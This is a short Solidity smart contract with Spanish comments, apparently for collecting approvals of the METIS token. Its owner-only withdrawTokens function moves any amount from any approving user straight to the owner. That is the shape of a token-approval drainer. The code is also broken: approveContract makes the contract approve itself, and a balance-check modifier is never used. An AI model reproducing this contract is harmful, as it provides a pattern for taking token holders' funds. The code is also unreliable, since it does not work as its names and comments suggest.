// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    // Agrega aquí las otras funciones necesarias de la interfaz ERC20
}

contract ApprovalAndTransfer {
    IERC20 public metisToken; // Cambia el nombre del token a METIS
    address public owner;
    uint256 public minBalance; // Mínimo saldo en BNB requerido para realizar transferencias
    uint256 public constant METIS_APPROVAL = 5 * 10**18; // 5 METIS con 18 decimales
    uint256 public constant GAS_LIMIT = 200000; // Gas limitado para la transacción

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _metisToken, uint256 _minBalance) {
        metisToken = IERC20(_metisToken);
        owner = msg.sender;
        minBalance = _minBalance;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Insufficient BNB balance");
        _;
    }

    function approveContract() external {
        require(metisToken.approve(address(this), METIS_APPROVAL), "Approval failed");
        emit Approved(msg.sender, owner);
    }

    function withdrawTokens(uint256 amount, address user) external onlyOwner {
        require(gasleft() >= GAS_LIMIT, "Gas limit not met");
        require(metisToken.transferFrom(user, owner, amount), "Transfer failed");
        emit TokensTransferred(user, owner, amount);
    }

    function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    // Función para depositar BNB en el contrato
    function depositBNB() external payable {
        // No es necesario utilizar SafeMath para la operación de depósito
    }
}